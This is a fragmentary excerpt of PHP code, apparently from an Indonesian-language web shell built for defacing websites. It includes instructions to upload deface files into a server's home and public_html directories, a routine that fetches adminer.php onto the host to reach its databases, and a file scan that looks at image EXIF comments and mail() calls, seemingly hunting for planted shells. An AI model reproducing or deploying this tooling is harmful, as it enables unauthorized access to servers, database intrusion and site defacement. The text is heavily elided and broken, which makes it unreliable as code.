		...
		NB: Sebelum gunain Tools ini , upload dulu file deface kalian di dir /home/user/ dan /home/user/public_html.</center><hr><br>";
			...
			if (isset($_POST['do_adminer'])) {
				...
				if (file_exists('adminer.php')) {
					...
					if (adminer("https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php", "adminer.php")) {echo "<center><font color=lime><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
					} else {
																																				...
																																				foreach (scandir($shcdirs) as $shc) {
																																					if ($shc != '.' && $shc != '..') {
																																						...
																																						if (!is_dir($shc) && !eregi("css", $shc)) {
																																							...
																																							$jembut = "COMPUTED";$taik   = "UserComment";$shcm = "/mail['(']/";
																																							if ($ifgt[$jembut][$taik]) {
